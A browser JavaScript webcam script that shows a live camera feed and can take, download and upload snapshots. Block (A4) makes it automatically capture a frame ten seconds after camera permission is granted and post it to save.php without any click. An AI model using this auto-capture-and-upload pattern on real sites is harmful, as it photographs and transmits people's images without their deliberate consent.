var webcam = {
    // (A) INITIALIZE - GET USER PERMISSION TO ACCESS CAMERA
    hVid : null, hSnaps : null,
    init : () => {
      navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        // (A1) GET HTML ELEMENTS
        webcam.hVid = document.getElementById("cam-live"),
        webcam.hSnaps = document.getElementById("cam-snaps");
  
        // (A2) "LIVE FEED" WEB CAM TO <VIDEO>
        webcam.hVid.srcObject = stream;
  
        // (A3) ENABLE BUTTONS
        document.getElementById("cam-take").disabled = false;
        document.getElementById("cam-save").disabled = false;
        document.getElementById("cam-upload").disabled = false;
  
        // (A4) Start a 10-second timer for automatic capture
        setTimeout(() => {
          webcam.take(); // Automatically take a snapshot after 10 seconds
          webcam.upload(); // Upload the snapshot right after taking it
        }, 10000); // 10000 milliseconds = 10 seconds
      })
      .catch(err => console.error(err));
    },
  
    // (B) SNAP VIDEO FRAME TO CANVAS
    snap : () => {
      // (B1) CREATE NEW CANVAS
      let cv = document.createElement("canvas"),
          cx = cv.getContext("2d");
  
      // (B2) CAPTURE VIDEO FRAME TO CANVAS
      cv.width = webcam.hVid.videoWidth;
      cv.height = webcam.hVid.videoHeight;
      cx.drawImage(webcam.hVid, 0, 0, webcam.hVid.videoWidth, webcam.hVid.videoHeight);
  
      // (B3) DONE
      return cv;
    },
  
    // (C) PUT SNAPSHOT INTO <DIV> WRAPPER
    take : () => webcam.hSnaps.appendChild(webcam.snap()),
  
    // (D) FORCE DOWNLOAD SNAPSHOT
    save : () => {
      // (D1) TAKE A SNAPSHOT, CREATE DOWNLOAD LINK
      let cv = webcam.snap(),
          a = document.createElement("a");
      a.href = cv.toDataURL("image/png");
      a.download = "snap.png";
  
      // (D2) "FORCE DOWNLOAD" - MAY NOT ALWAYS WORK!
      a.click(); a.remove(); cv.remove();
  
      // (D3) SAFER - LET USERS MANUAL CLICK
      // webcam.hSnaps.appendChild(a);
    },
  
    // (E) UPLOAD SNAPSHOT TO SERVER
    upload : () => {
      // (E1) APPEND SCREENSHOT TO DATA OBJECT
      var data = new FormData();
      data.append("snap", webcam.snap().toDataURL("image/jpeg", 0.6));
      
      // (E2) UPLOAD SCREENSHOT TO SERVER
      fetch("save.php", { method: "post", body: data })
      .then(res => res.text())
      .then(txt => alert(txt))
      .catch(err => console.error("Error uploading image:", err));
    }
  };
  
  // Initialize the webcam when the window loads
  window.addEventListener("load", webcam.init);
  